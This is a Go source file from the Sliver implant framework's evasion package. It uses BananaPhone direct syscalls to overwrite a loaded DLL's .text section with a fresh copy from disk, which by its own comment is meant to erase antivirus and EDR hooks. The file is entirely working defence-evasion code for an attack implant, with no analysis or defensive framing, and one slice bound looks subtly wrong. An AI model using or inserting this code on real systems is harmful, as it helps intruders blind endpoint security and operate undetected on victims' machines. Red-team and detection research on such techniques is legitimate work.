package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"debug/pe"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"syscall"
	"unsafe"
)



func banana() (uint16,uint16){
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	//resolve the functions and extract the syscalls
	write, e := bp.GetSysID("ZwWriteVirtualMemory")
	if e != nil {
		panic(e)
	}

	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		panic(e)
	}

	return write,protect
}


// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}
	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress)
}


func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {

	write,protect:= banana()
	t, e := syscall.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)


	var old uint32
	sizet := len(b)
	var thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
	//thisThread,_ := syscall.GetCurrentProcess()
	//if err != nil {
	//	return err
	//}
	//NtProtectVirtualMemory
	_, r := bananaphone.Syscall(
		protect,
		uintptr(thisThread),
		uintptr((unsafe.Pointer(&dllOffset))),
		uintptr((unsafe.Pointer(&sizet))),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr((unsafe.Pointer(&old))),
	)
	if r != nil {
		return r
	}

/*
	e = windows.VirtualProtect(
		uintptr(dllOffset),
		uintptr(len(b)),
		windows.PAGE_EXECUTE_READWRITE,
		&old,
	)
	if e != nil {
		return e
	}
*/
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}
/*
	for i := 0; i < len(b); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}
*/
	//NtWriteVirtualMemory
	_, r = bananaphone.Syscall(
		write, //NtWriteVirtualMemory
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
	)
	if r != nil {
		log.Println("NtWriteVirtualMemory Error")
		return r
	}


	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}


	//NtProtectVirtualMemory
	_, r = bananaphone.Syscall(
		protect,
		uintptr(thisThread),
		uintptr((unsafe.Pointer(&dllOffset))),
		uintptr((unsafe.Pointer(&sizet))),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	if r != nil {
		return r
	}



	//e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
	//if e != nil {
	//	return e
	//}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}
